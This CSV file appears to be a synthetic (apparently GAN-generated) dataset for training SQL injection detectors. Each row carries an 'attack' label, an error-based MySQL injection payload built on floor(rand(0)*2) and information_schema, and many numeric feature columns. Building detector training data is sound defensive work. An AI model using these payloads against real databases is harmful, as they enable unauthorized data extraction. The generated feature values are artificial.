id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000346,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.575273860288267,290.95367431640625,95.76419830322266,42.0905647277832,101.96369934082031,11.643619537353516,94.38532257080078,36.17159652709961,0.9951842427253723,0.3450896739959717,0.15467599034309387,0.3765392601490021,0.13786941766738892,3.8033692836761475,1.906805396080017,0.6702054142951965,0.6509343385696411,0.18910126388072968,-0.5708315372467041,-0.20196782052516937,9.1654691696167,11.050877571105957,3.5575344562530518,0.048748306930065155,1.844828486442566,0.2657206654548645,-0.5348412394523621,0.42839497327804565,0.09617865830659866,0.6702757477760315,0.4533088803291321,-0.14047381281852722,1.5131444931030273,0.1431025117635727,0.12995178997516632,2.1799774169921875,7.925939083099365,1.100781798362732,2.1720449924468994,0.6114629507064819,0.5672316551208496,1.2840590476989746,-0.05293435603380203,-0.004135693423449993,-0.1983681321144104,0.24908238649368286,0.38195517659187317,0.535585343837738,0.3738042712211609,0.3746625781059265,0.49950069189071655,0.45006343722343445,-0.10860912501811981,-0.12380968779325485,0.6393411755561829,0.06996846944093704,0.3439333736896515,0.24045830965042114,0.45446470379829407,-0.2650817632675171,-0.17657257616519928,0.1424587219953537,0.0312759131193161,-0.2644195556640625,-0.08194756507873535,-0.16985784471035004,0.6138472557067871,-0.04970340058207512,0.41869544982910156,0.09248140454292297,-0.2187720090150833,0.3829801678657532,0.07613196969032288,-0.1490868330001831,0.23150113224983215,0.1723669171333313,0.5262819528579712,0.2852020263671875,-0.1014786809682846,0.09938187152147293,0.6119953393936157,10.488136291503906,0.6219807267189026,0.21806077659130096,0.08952466398477554,0.8429111242294312,-0.010179415345191956,0.220688596367836,-0.16403961181640625
GAN_000347,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.47515403106255,298.6993408203125,96.34452819824219,41.521705627441406,108.50267028808594,12.03832721710205,96.05960845947266,36.35915756225586,1.180234670639038,0.3626198470592499,0.1527032107114792,0.3755004107952118,0.13911457359790802,3.8337690830230713,1.9762020111083984,0.5644211173057556,0.441599577665329,0.15690460801124573,-0.7063222527503967,-0.12497717142105103,9.087899208068848,10.704728126525879,3.790099620819092,0.022953912615776062,1.806318759918213,0.22272621095180511,-0.5696327686309814,0.3885975778102875,0.11190733313560486,0.7304593324661255,0.42920297384262085,-0.22466103732585907,1.5140222311019897,0.16042649745941162,0.17197681963443756,2.0732386112213135,8.129772186279297,1.1994922161102295,2.204462766647339,0.5450167059898376,0.5439534783363342,1.1936203241348267,-0.25823840498924255,0.0027975523844361305,-0.1889359951019287,0.2148815542459488,0.35204118490219116,0.48838746547698975,0.3415309488773346,0.3381214141845703,0.4705653190612793,0.39605391025543213,-0.23771265149116516,-0.13459131121635437,0.6505944132804871,0.08643624186515808,0.2863669991493225,0.14316734671592712,0.4258687198162079,-0.25249865651130676,-0.23471254110336304,0.15234127640724182,0.0069501325488090515,-0.20931312441825867,0.041235052049160004,-0.18214617669582367,0.6005331873893738,-0.05700317397713661,0.299991250038147,0.13658761978149414,-0.17086757719516754,0.37423062324523926,0.14808647334575653,-0.054012101143598557,0.4290359914302826,0.1914164423942566,0.414847731590271,0.26780015230178833,-0.12567946314811707,0.03528818115592003,0.6438077688217163,11.113801002502441,0.5817455649375916,0.19410064816474915,0.10215241461992264,0.8316377401351929,-0.2050251066684723,0.13852128386497498,-0.23804935812950134
GAN_000348,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.962343194945363,293.0233459472656,94.89356994628906,40.5571403503418,108.88951110839844,16.864696502685547,86.15367889404297,36.38649368286133,0.8623528480529785,0.3459850251674652,0.15421418845653534,0.37148505449295044,0.14470288157463074,3.853123188018799,1.9906255006790161,0.7430992722511292,0.6755292415618896,0.3442135751247406,-0.7501022815704346,-0.505266547203064,8.144584655761719,11.908138275146484,2.999568462371826,-0.0014772489666938782,1.6461548805236816,0.35049960017204285,-0.738405704498291,0.5008651614189148,0.06473612040281296,0.4730292558670044,0.6975911855697632,-0.3446003496646881,1.3893404006958008,-0.010478856042027473,0.15606556832790375,2.12915301322937,8.284083366394043,0.9494344592094421,2.5679078102111816,0.5531679391860962,0.47475406527519226,1.2387034893035889,0.019586794078350067,0.0006251307786442339,-0.21614310145378113,0.18502454459667206,0.21777324378490448,0.6179506778717041,0.2714170515537262,0.3536674380302429,0.4687957763671875,0.345869243144989,-0.011640628799796104,-0.2648859918117523,0.681739330291748,0.12896092236042023,0.4801257848739624,0.19158238172531128,0.23910769820213318,-0.41086098551750183,-0.07180511206388474,0.5260280966758728,0.1855802834033966,-0.32997453212738037,0.04694969952106476,-0.5822225213050842,0.6350898742675781,-0.1570349484682083,0.31292760372161865,0.1138153225183487,0.16095295548439026,0.5838878154754639,0.08496922999620438,-0.1308717131614685,0.49650299549102783,0.38606512546539307,0.43045490980148315,0.2820700407028198,-0.33089688420295715,0.085606649518013,0.5894101858139038,11.615050315856934,0.6131104230880737,0.24770782887935638,0.02612869255244732,0.8172131180763245,0.2932570278644562,0.38277363777160645,-0.1368466317653656
GAN_000349,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.792294228287213,299.7502136230469,90.6141128540039,43.3989372253418,111.45905303955078,14.963881492614746,89.09796905517578,37.7768669128418,1.0139782428741455,0.3500754237174988,0.15529502928256989,0.37494561076164246,0.142793208360672,3.8441901206970215,2.2134194374084473,0.7231963276863098,0.6304699182510376,0.31609970331192017,-0.6065544486045837,-0.35360947251319885,8.749327659606934,11.383213996887207,3.4257872104644775,0.15454772114753723,1.49415123462677,0.3049880266189575,-0.4687957465648651,0.4771328866481781,0.1841127574443817,0.5637652277946472,0.35130953788757324,-0.2226560115814209,1.1982876062393188,0.16185583174228668,0.20506644248962402,2.2146542072296143,8.172152519226074,1.0338926315307617,2.403482675552368,0.6269254684448242,0.5263442397117615,1.0726282596588135,0.07298728823661804,-0.01634451188147068,-0.28112491965293884,0.04943475127220154,0.3124248683452606,0.5346116423606873,0.3044300973415375,0.3856573700904846,0.4587830603122711,0.4932856559753418,-0.05159671977162361,-0.15745562314987183,0.6156108379364014,0.09875179082155228,0.46087267994880676,0.18707582354545593,0.36197736859321594,-0.23078419268131256,-0.1742149293422699,0.4036700427532196,-0.07403919100761414,-0.16597387194633484,0.10370484739542007,-0.20083090662956238,0.6727666258811951,-0.224914088845253,0.11787384003400803,0.05180012434720993,-0.09106950461864471,0.49766725301742554,0.05854106694459915,-0.036684077233076096,0.36501744389533997,0.1818992793560028,0.3541838228702545,0.3206307590007782,-0.1583552062511444,0.04871086776256561,0.5986485481262207,11.003191947937012,0.5787143111228943,0.25269779562950134,0.08135301619768143,0.8562867641448975,0.05079025775194168,0.0977075845003128,-0.013207189738750458
GAN_000350,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.567509845675962,296.5478515625,90.84686279296875,41.538455963134766,107.47100830078125,11.249030113220215,93.76810455322266,36.67418670654297,0.9581432938575745,0.35918277502059937,0.15154898166656494,0.37909960746765137,0.1346600204706192,3.8117892742156982,2.1570544242858887,0.6460269689559937,0.5647081136703491,0.18385381996631622,-0.5109328627586365,-0.08103945851325989,9.242968559265137,11.533710479736328,3.563616991043091,0.0270837489515543,1.7262582778930664,0.2666490972042084,-0.4913789927959442,0.5254428386688232,0.13764308393001556,0.6814053654670715,0.2999309003353119,-0.24527598917484283,1.3913310766220093,-0.06538265198469162,0.27943146228790283,2.17464017868042,8.463393211364746,1.1012694835662842,2.4765212535858154,0.5911632776260376,0.5100985169410706,1.2752262353897095,-0.08298024535179138,-0.020061319693922997,-0.051605239510536194,0.18638211488723755,0.2751511335372925,0.44865819811820984,0.320492684841156,0.47119197249412537,0.4464546740055084,0.496442049741745,-0.046338245272636414,-0.08910642564296722,0.7051962614059448,0.1644398719072342,0.3374057710170746,0.08852487802505493,0.3342195451259613,-0.3484600782394409,-0.18032673001289368,0.4673166573047638,0.03531183302402496,-0.32594093680381775,0.059454865753650665,-0.34054034948349,0.6602545380592346,-0.1266872137784958,0.1068243682384491,0.06485891342163086,-0.21497616171836853,0.2490282654762268,0.1725221425294876,-0.1520826667547226,0.3638452887535095,0.22817397117614746,0.5267606377601624,0.2265673577785492,-0.16169604659080505,0.04073480889201164,0.5879648327827454,11.278942108154297,0.5628938674926758,0.245558500289917,0.09677550196647644,0.868302583694458,-0.04821035638451576,0.26639652252197266,0.17158037424087524
GAN_000351,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.538338724624859,298.2574462890625,94.7513427734375,39.094722747802734,103.49735260009766,18.39677619934082,103.35688018798828,31.678340911865234,0.8907004594802856,0.3795035183429718,0.1551956683397293,0.3659737706184387,0.14259345829486847,3.8226962089538574,2.3805718421936035,0.7694096565246582,0.4201502799987793,0.10803436487913132,-0.8750183582305908,-0.07566970586776733,8.784786224365234,10.402263641357422,4.374125957489014,0.13046681880950928,1.675737977027893,0.2724243402481079,-0.7491415739059448,0.4028986990451813,0.1056801825761795,0.7215718626976013,0.5680592656135559,-0.23584485054016113,1.662023663520813,0.1557697355747223,0.08450708538293839,2.176992416381836,7.474790573120117,1.2437852621078491,2.2065646648406982,0.6744441986083984,0.6568458080291748,1.309370994567871,-0.24179884791374207,-0.040573544800281525,-0.22444963455200195,0.23205377161502838,0.5595032572746277,0.46007850766181946,0.26221656799316406,0.20957599580287933,0.5810095071792603,0.2791876196861267,-0.2706166207790375,-0.21073995530605316,0.6798762083053589,0.051578063517808914,0.44560807943344116,0.05639807879924774,0.6432101130485535,-0.33365046977996826,-0.22307328879833221,0.2671530246734619,0.05648118257522583,-0.363249272108078,0.2717236876487732,-0.3308804929256439,0.654446005821228,0.03547036647796631,0.3405334949493408,0.5125882029533386,-0.23902606964111328,0.6078115105628967,0.06090066581964493,-0.005997072905302048,0.4530647397041321,0.12807612121105194,0.23154541850090027,0.23235481977462769,-0.21244938671588898,0.04348035901784897,0.6621938943862915,12.070612907409668,0.593593418598175,0.2578332722187042,0.11285091191530228,0.9397072792053223,-5.157291889190674e-05,0.30382391810417175,-0.08844279497861862
GAN_000352,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.904059033087277,299.6421203613281,90.71004486083984,43.459869384765625,111.37289428710938,11.358535766601562,87.43977355957031,38.32561492919922,1.1626739501953125,0.34464138746261597,0.15883281826972961,0.3824250400066376,0.14059875905513763,3.8392951488494873,1.796386480331421,0.6903164982795715,0.4935932457447052,0.25363466143608093,-0.5372881293296814,-0.2501435875892639,8.793245315551758,11.441100120544434,3.194316864013672,0.07070352137088776,1.6904573440551758,0.27689239382743835,-0.39620187878608704,0.47994887828826904,0.13221397995948792,0.70655357837677,0.4931538701057434,-0.038872409611940384,1.409113883972168,-0.05796130746603012,0.19596825540065765,2.1192054748535156,7.847707748413086,1.0451836585998535,2.549595832824707,0.46179038286209106,0.5560905337333679,1.0885722637176514,-0.09883280843496323,-0.003978869877755642,-0.03274904191493988,0.22579064965248108,0.24476346373558044,0.5500528216362,0.27356627583503723,0.5113548040390015,0.4250362813472748,0.4268539249897003,-0.21326114237308502,0.02816694974899292,0.6311196088790894,0.12244968861341476,0.3063976764678955,0.1941288411617279,0.31900516152381897,-0.3516216278076172,-0.11519045382738113,0.29685133695602417,0.01205916702747345,-0.20252108573913574,0.09522270411252975,-0.2905607521533966,0.57381671667099,-0.1300206333398819,0.29166126251220703,-0.0910073071718216,-0.12035110592842102,0.41149282455444336,0.10633521527051926,-0.10931847989559174,0.4061562716960907,0.3591502904891968,0.4939039647579193,0.3162754476070404,-0.2935938239097595,0.07950379699468613,0.5542914867401123,10.79739761352539,0.6920822858810425,0.24272267520427704,0.10286326706409454,0.829990565776825,-0.021811529994010925,0.1359333097934723,-0.14900445938110352
GAN_000353,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.3640729987548,290.5481262207031,92.30976867675781,40.89823913574219,102.8552017211914,12.060005187988281,92.94219207763672,35.203575134277344,0.9713578820228577,0.3563286364078522,0.15369483828544617,0.37451887130737305,0.13414305448532104,3.8127880096435547,2.099235773086548,0.7478235960006714,0.5249398350715637,0.1609388142824173,-0.4101603925228119,-0.19346760213375092,9.123169898986816,10.831161499023438,3.9212403297424316,0.16948921978473663,1.7980843782424927,0.28425174951553345,-0.4645969271659851,0.41880184412002563,0.15349607169628143,0.8442607522010803,0.15718725323677063,-0.07387074828147888,1.6862702369689941,0.16017279028892517,0.24285869300365448,2.1551074981689453,8.594440460205078,1.1993764638900757,2.5011658668518066,0.4462868869304657,0.45388761162757874,1.0984855890274048,-0.02771471068263054,0.021950772032141685,-0.3830052614212036,0.32917413115501404,0.5110316276550293,0.45467033982276917,0.40145793557167053,0.2698604166507721,0.5167326927185059,0.4301185607910156,0.02341289445757866,-0.30619752407073975,0.5863052010536194,0.08222095668315887,0.3388604521751404,-0.03609779477119446,0.22098907828330994,-0.00942386593669653,-0.4183807075023651,0.19969958066940308,-0.10147759318351746,-0.2409878969192505,-0.05227544903755188,-0.12977685034275055,0.6249217987060547,0.01797947660088539,0.22172129154205322,0.2428538203239441,-0.058045513927936554,0.21475160121917725,0.1221657320857048,0.07334068417549133,0.3199251890182495,0.10550187528133392,0.5039746761322021,0.2838059067726135,-0.12522494792938232,0.10495591163635254,0.6528075933456421,10.978532791137695,0.5191895961761475,0.16678579151630402,0.05552512779831886,0.9423742294311523,-0.23645395040512085,0.03631773591041565,-0.03740307688713074
GAN_000354,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.6599506632416965,289.34796142578125,93.49901580810547,41.68165588378906,106.54975891113281,14.466316223144531,93.38668823242188,34.68115997314453,0.9885185360908508,0.36351338028907776,0.1574549674987793,0.38264840841293335,0.13839419186115265,3.7630600929260254,1.8123421669006348,0.5877835154533386,0.5963954925537109,0.24292562901973724,-0.6710458993911743,-0.09203803539276123,9.050765991210938,11.378717422485352,4.061984539031982,-0.02123868092894554,1.7773431539535522,0.2659663259983063,-0.5523593425750732,0.33446693420410156,0.13064074516296387,0.6971541047096252,0.4190146327018738,-0.2413092404603958,1.4743547439575195,0.04317840188741684,0.22274962067604065,2.103301763534546,8.02983283996582,1.334455132484436,2.3366036415100098,0.584844172000885,0.6006872057914734,1.2112712860107422,-0.17544972896575928,0.006611800752580166,-0.30850082635879517,0.30533266067504883,0.5429258346557617,0.41854342818260193,0.3558165729045868,0.33845657110214233,0.48093166947364807,0.4223017394542694,-0.18541082739830017,-0.12743733823299408,0.6180164813995361,0.12731318175792694,0.33613038063049316,0.179339200258255,0.27634766697883606,-0.39347043633461,-0.3195780813694,0.23069903254508972,-0.022611837834119797,-0.16780799627304077,0.028668124228715897,-0.19937540590763092,0.638151228427887,-0.19088532030582428,0.35154324769973755,0.07821252942085266,-0.14969417452812195,0.29119277000427246,0.13270312547683716,-0.02384469285607338,0.5047293305397034,0.21870017051696777,0.4605250358581543,0.2616373598575592,-0.038373325020074844,0.10080219805240631,0.6813786029815674,11.316564559936523,0.5024985074996948,0.20320433378219604,0.0970408171415329,0.867760956287384,-0.022142160683870316,0.23010876774787903,-0.15726971626281738
GAN_000355,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,5.720686644634509,285.5921630859375,91.71839141845703,45.139095306396484,112.15510559082031,16.779741287231445,88.66777801513672,38.80692672729492,1.1622748374938965,0.3504301905632019,0.14985156059265137,0.37916550040245056,0.12967130541801453,3.804427146911621,2.1130740642547607,0.7099602222442627,0.6248679757118225,0.25110387802124023,-0.5763593912124634,-0.23385751247406006,9.620201110839844,11.890689849853516,3.417376756668091,0.1130463033914566,1.7463328838348389,0.3227194845676422,-0.47530829906463623,0.4926639795303345,0.14694130420684814,0.7575666308403015,0.45186907052993774,-0.17281372845172882,1.4381325244903564,0.09897365421056747,0.2497694045305252,2.1733486652374268,8.075157165527344,1.1336604356765747,2.8595409393310547,0.5619956851005554,0.5445733666419983,1.0618563890457153,0.08117641508579254,0.015150369144976139,-0.07450924813747406,0.13122062385082245,0.3053675591945648,0.4708958864212036,0.29631656408309937,0.3406267762184143,0.38525211811065674,0.47413256764411926,-0.1463480293750763,-0.46300259232521057,0.5230786204338074,0.10069691389799118,0.39297977089881897,0.11391813308000565,0.23387306928634644,-0.26477694511413574,-0.25812211632728577,0.29345256090164185,-0.2088501900434494,-0.24976345896720886,0.0937216579914093,-0.3058389723300934,0.5881174802780151,-0.22591914236545563,0.1735651195049286,0.08253766596317291,-0.02258557453751564,0.3511756956577301,0.3089505434036255,-0.1104564219713211,0.47267386317253113,0.2949765920639038,0.43736037611961365,0.28652650117874146,-0.203874409198761,0.054025743156671524,0.6424116492271423,11.147265434265137,0.5737836360931396,0.24376598000526428,0.06915388256311417,0.9200583100318909,0.005402505397796631,0.1339201033115387,-0.04201050102710724
GAN_000356,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.486346499336142,296.543701171875,100.04629516601562,42.669044494628906,107.22869110107422,16.62286949157715,99.82064819335938,33.109134674072266,0.9767665863037109,0.3807443380355835,0.14944754540920258,0.3668920695781708,0.13258002698421478,3.8099191188812256,2.1173839569091797,0.6391155123710632,0.5346481800079346,0.1418161541223526,-0.8036495447158813,-0.03432537615299225,8.637763023376465,11.660964965820312,4.178028583526611,0.025631191208958626,1.7022285461425781,0.30631738901138306,-0.8318105936050415,0.331886887550354,0.11770441383123398,0.9062636494636536,0.7041550278663635,-0.3260706067085266,1.6516265869140625,0.3491162955760956,0.13765446841716766,2.012346029281616,8.039020538330078,1.0990419387817383,2.5160763263702393,0.5702121257781982,0.6015793681144714,1.3725659847259521,-0.15182851254940033,0.011284892447292805,-0.14909854531288147,0.41569897532463074,0.27338674664497375,0.517880380153656,0.29000556468963623,0.28398436307907104,0.4677438735961914,0.30718764662742615,-0.2924439609050751,-0.27594879269599915,0.674278199672699,0.1120595932006836,0.4333256781101227,-0.18566060066223145,0.6642817258834839,-0.45636507868766785,-0.40703901648521423,0.40770670771598816,0.10820281505584717,-0.49308905005455017,0.1563565731048584,-0.43419522047042847,0.6095883846282959,-0.051415178924798965,0.40821802616119385,0.34200000762939453,-0.19011710584163666,0.500514805316925,0.1208338811993599,-0.1759142428636551,0.6223542094230652,0.14611046016216278,0.43335652351379395,0.1708034873008728,-0.10182060301303864,0.04502425715327263,0.7015265822410583,11.838833808898926,0.5783944725990295,0.2850636839866638,0.06288938969373703,0.8851145505905151,0.017120838165283203,0.5426125526428223,-0.1193680688738823
GAN_000357,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,5.733428152506512,285.3774719238281,91.18721008300781,40.89014434814453,105.40824890136719,14.371850967407227,94.11911010742188,34.9678955078125,0.9321678876876831,0.3691951036453247,0.15537621080875397,0.37668582797050476,0.14161700010299683,3.786564826965332,1.7744680643081665,0.8169974684715271,0.497000515460968,0.18657568097114563,-0.6537541151046753,-0.1437670886516571,9.104758262634277,11.2682523727417,3.421309232711792,0.03733799606561661,1.6948606967926025,0.3330676257610321,-0.42693111300468445,0.4749428927898407,0.11119266599416733,0.6065986156463623,0.5323194265365601,-0.24804559350013733,1.664924144744873,0.11412737518548965,0.12630325555801392,2.1468217372894287,7.534473896026611,1.193718671798706,2.2564146518707275,0.6726656556129456,0.6327940225601196,1.2814321517944336,-0.09457428008317947,-0.026450669392943382,-0.15448787808418274,0.10543233901262283,0.3267422318458557,0.4814108908176422,0.2108086794614792,0.4288823902606964,0.5052021145820618,0.4284018576145172,-0.1084444671869278,-0.12684257328510284,0.6433479189872742,0.15699513256549835,0.3697624206542969,0.28652963042259216,0.17699679732322693,-0.35921788215637207,-0.11159610748291016,0.35090121626853943,0.13314077258110046,-0.09449353814125061,-0.04642513394355774,-0.3489936888217926,0.6387231349945068,-0.07384037971496582,0.33380329608917236,0.17498095333576202,-0.048073623329401016,0.3956015110015869,0.09463094919919968,0.08196189999580383,0.49898242950439453,0.3033830225467682,0.3431342542171478,0.2825487554073334,-0.19686512649059296,0.09910500794649124,0.6257954835891724,11.829097747802734,0.5990960597991943,0.24863438308238983,0.10998495668172836,0.8882279992103577,0.15432220697402954,0.10861244052648544,-0.11894229799509048
GAN_000358,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,5.88551559842959,296.0980529785156,95.54328155517578,38.84282302856445,109.76175689697266,18.735105514526367,94.65162658691406,34.283294677734375,0.9160129427909851,0.3749600648880005,0.1566992998123169,0.37216803431510925,0.14414377510547638,3.7790303230285645,2.0486085414886475,0.6196916699409485,0.6815158724784851,0.2522835433483124,-0.643180251121521,-0.17236225306987762,8.996733665466309,12.350234031677246,3.5324149131774902,0.14546065032482147,1.7859992980957031,0.34549495577812195,-0.725719690322876,0.4740612506866455,0.06535319238901138,0.5439091920852661,0.6693523526191711,-0.2560591399669647,1.3420677185058594,0.22086097300052643,0.2317332625389099,1.9524683952331543,8.618775367736816,1.2162922620773315,2.28647518157959,0.45719030499458313,0.6273104548454285,1.2100940942764282,-0.1148645356297493,-0.0032339459285140038,-0.2469533383846283,0.23308396339416504,0.1750296801328659,0.5592004656791687,0.35059407353401184,0.3739281892776489,0.5545830726623535,0.4258665442466736,-0.1415429711341858,-0.11405457556247711,0.6648514866828918,0.087638720870018,0.4406355321407318,0.04181697219610214,0.34743446111679077,-0.35570070147514343,-0.185015469789505,0.4165762960910797,0.11647805571556091,-0.3389739394187927,-0.045104995369911194,-0.5559988617897034,0.6765155792236328,-0.07262623310089111,0.20396305620670319,0.2262250781059265,-0.11271250993013382,0.48462003469467163,0.16837508976459503,-0.015150636434555054,0.5987021327018738,0.18829990923404694,0.419635534286499,0.22288793325424194,-0.26685935258865356,0.0961047112941742,0.6794663071632385,11.636180877685547,0.559647262096405,0.23673494160175323,0.037457697093486786,0.867950975894928,0.09987211972475052,0.43195024132728577,-0.14415818452835083
